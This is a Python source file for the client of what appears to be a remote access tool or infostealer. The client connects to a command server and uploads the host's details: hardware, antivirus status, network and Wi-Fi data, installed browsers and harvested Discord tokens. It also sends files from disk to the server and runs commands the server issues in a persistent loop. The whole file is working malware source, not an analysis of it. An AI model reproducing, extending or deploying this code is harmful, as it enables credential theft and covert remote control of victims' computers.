import asyncio
import os
import json
import platform
import uuid
import psutil
import aiofiles
import time
from modules import wifi
from modules.discord import discord
from modules.browser.browser_shared import get_installed_browsers
from modules.disk import disk
from modules.antivirus import antivirus
from common import utils
from client.handlers import CommandHandler
from client_types.message import MESSAGE_TYPE_CONNECTION, MESSAGE_TYPE_PING, Message, MESSAGE_TYPE_CONNECT
from modules._sec._sec import Sec


class Client:
    """Client class to represent a client that connects to the server."""
    def __init__(self, server_address: tuple[str, int], command_handler: CommandHandler) -> None:
        self.server_address = server_address
        self.command_handler = command_handler
        self.sec = Sec()
        self.reader = None
        self.writer = None

    async def connect_to_server(self) -> None:
        """Connect to the server."""
        try:
            self.reader, self.writer = await asyncio.open_connection(*self.server_address)
            await self.send(json.dumps(Message(type=MESSAGE_TYPE_CONNECT, json_data={"uuid": str(uuid.UUID(int=uuid.getnode()))}).to_dict()))

            response = await self.receive()
            handshake = json.loads(response)
            if handshake["type"] == "handshake":
                self.sec.save_public_key(handshake["json_data"]["public_key"])
                self.sec.load_public_key()
                print(f"Connected to server at {self.server_address} HANDSHAKE")
            elif handshake["type"] == "ack":
                self.sec.load_public_key()
                print(f"Connected to server at {self.server_address} ACK")
            else:
                print(f"Failed to connect to server at {self.server_address}: {handshake['error']}")
                await self.close()
        except Exception as e:
            print(f"Failed to connect to server at {self.server_address}: {e}")
            await self.close()

    async def send_system_info(self) -> None:
        """Send system information to the server."""
        ip = "127.0.0.1"
        country = "Norway"
        isp = "Telenor"

        await self.send(json.dumps(Message(type=MESSAGE_TYPE_CONNECTION, json_data={
            "computer_name": platform.node(),
            "computer_os": platform.system(),
            "computer_version": platform.version(),
            "total_memory": psutil.virtual_memory().total,
            "up_time": time.strftime("%H:%M:%S", time.gmtime(psutil.boot_time())),
            "uuid": str(uuid.UUID(int=uuid.getnode())),
            "cpu": platform.processor(),
            "gpu": utils.get_gpu_info(),
            "uac": utils.isUserAdmin(),
            "anti_virus": json.dumps(antivirus.Antivirus().execute()),
            "ip": ip,
            "client_ip": utils.get_external_ip(),
            "country": country,
            "mac_address": ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2*6, 2)]),
            "gateway": psutil.net_if_addrs().get('Ethernet')[1].address if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "dns": ', '.join([dns.address for dns in psutil.net_if_addrs().get('Ethernet') if dns and dns.family == 2]) if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "subnet_mask": psutil.net_if_addrs().get('Ethernet')[0].netmask if psutil.net_if_addrs().get('Ethernet') else 'N/A',
            "isp": isp,
            "timezone": time.tzname[0],
            "disks": json.dumps(disk.Disk().execute()),
            "wifi": wifi.get_wifi(),
            "webbrowsers": get_installed_browsers(),
            "discord_tokens": discord.Discord().execute(),
        }).to_dict()))

    async def send(self, data: str, chunk_size: int = 2048) -> None:
        """Send data to the server with a fixed-length header."""
        encrypted_data = self.sec.encrypt(data)
        if encrypted_data:
            header = json.dumps({
                "type": "JSON",
                "total_size": len(encrypted_data),
            })
        else:
            encrypted_data = data.encode('utf-8')
            header = json.dumps({
                "type": "JSON",
                "total_size": len(data),
            })

        header_length = len(header).to_bytes(4, 'big')
        self.writer.write(header_length + header.encode('utf-8'))
        for i in range(0, len(encrypted_data), chunk_size):
            chunk = encrypted_data[i:i + chunk_size]
            self.writer.write(chunk)
        await self.writer.drain()

    async def send_file(self, file_path: str, file_offset: int = 0, file_total_amount: int = 1, tags: list[str] = [""]) -> None:
        """Send a file to the server with metadata and chunked content."""
        try:
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"File not found: {file_path}")

            file_name = os.path.basename(file_path)
            file_type = utils.get_mime_type(file_path)

            async with aiofiles.open(file_path, "rb") as file:
                file_data = await file.read()
                encrypted_data = self.sec.encrypt(file_data.decode('utf-8'))

            metadata = json.dumps({
                "file_name": file_name,
                "file_size": len(encrypted_data),
                "file_type": file_type,
                "file_offset": file_offset,
                "file_total_amount": file_total_amount,
                "tags": tags,
            })

            metadata_header = json.dumps({
                "type": "FILE",
                "total_size": len(metadata),
            })

            self.writer.write(len(metadata_header).to_bytes(4, 'big') + metadata_header.encode('utf-8'))
            self.writer.write(metadata.encode('utf-8'))
            self.writer.write(encrypted_data)
            await self.writer.drain()

            print(f"File '{file_name}' successfully sent to server.")
        except FileNotFoundError as e:
            print(f"Error: {e}")
        except ValueError as e:
            print(f"Error: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {e}")

    async def receive(self) -> str:
        """Receive data from the server."""
        chunks = []
        while True:
            chunk = await self.reader.read(8192)
            if b'END_OF_MESSAGE' in chunk:
                chunks.append(chunk.replace(b'END_OF_MESSAGE', b'').decode('utf-8'))
                break
            chunks.append(chunk.decode('utf-8'))
        return ''.join(chunks)

    async def send_keep_alive(self) -> None:
        """Send a keep-alive message."""
        try:
            await self.send(json.dumps(Message(type=MESSAGE_TYPE_PING, json_data={}).to_dict()))
        except Exception as e:
            print(f"Failed to send keep-alive message: {e}")

    async def run(self) -> None:
        """Run the client."""
        await self.connect_to_server()
        await self.send_system_info()

        keep_alive_task = asyncio.create_task(self.keep_alive())
        try:
            while True:
                data = await self.receive()
                if not data:
                    print("Server closed the connection.")
                    break
                await self.command_handler.handle(self, data)
        except Exception as e:
            print(f"Error in client lifetime: {e}")
        finally:
            keep_alive_task.cancel()
            await self.close()

    async def keep_alive(self) -> None:
        """Keep-alive loop."""
        while True:
            await self.send_keep_alive()
            await asyncio.sleep(30)

    async def close(self) -> None:
        """Close the client connection."""
        if self.writer:
            self.writer.close()
            await self.writer.wait_closed()
